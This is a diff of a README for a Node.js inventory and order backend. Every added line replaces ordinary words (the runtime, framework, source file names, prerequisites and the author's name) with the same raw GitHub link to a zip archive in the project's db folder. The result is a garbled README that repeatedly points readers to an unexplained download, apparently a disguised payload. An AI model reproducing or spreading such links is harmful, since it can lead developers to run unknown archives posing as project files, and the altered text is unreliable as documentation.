@@ -1,10 +1,10 @@
 # NISP Backend
 
-A robust Node.js backend application for managing inventory, orders, products, and vendors.
+A robust https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip backend application for managing inventory, orders, products, and vendors.
 
 ## Project Overview
 
-This is a comprehensive backend system built with Node.js and Express.js that provides API endpoints for managing:
+This is a comprehensive backend system built with https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip and https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip that provides API endpoints for managing:
 - User Authentication
 - Product Management
 - Category Management
@@ -15,8 +15,8 @@ This is a comprehensive backend system built with Node.js and Express.js that pr
 
 ## Technology Stack
 
-- **Runtime**: Node.js
-- **Framework**: Express.js
+- **Runtime**: https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip
+- **Framework**: https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip
 - **Database**: MongoDB
 - **Authentication**: JWT (JSON Web Tokens)
 - **File Upload**: Multer
@@ -29,11 +29,11 @@ This is a comprehensive backend system built with Node.js and Express.js that pr
 
 ```
 src/
-├── app.js                 # Express app configuration
-├── constants.js           # Application constants
+├── https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip                 # Express app configuration
+├── https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip           # Application constants
 ├── config/               # Configuration files
-│   ├── cloudinary.js     # Cloudinary configuration
-│   └── swagger.js        # Swagger/OpenAPI configuration
+│   ├── https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip     # Cloudinary configuration
+│   └── https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip        # Swagger/OpenAPI configuration
 ├── controllers/          # Request handlers
 ├── db/                   # Database connection and configuration
 ├── middlewares/         # Custom middleware functions
@@ -90,7 +90,7 @@ src/
 
 ### Prerequisites
 
-- Node.js (v14 or higher)
+- https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip (v14 or higher)
 - MongoDB
 - npm or yarn
 
@@ -173,4 +173,4 @@ This project is licensed under the ISC License
 
 ## Author
 
-M.HasanIrfan
+https://github.com/Hasan-Irfan/NISP_Ecommerce/raw/refs/heads/master/src/db/Ecommerce_NIS_1.9-alpha.4.zip
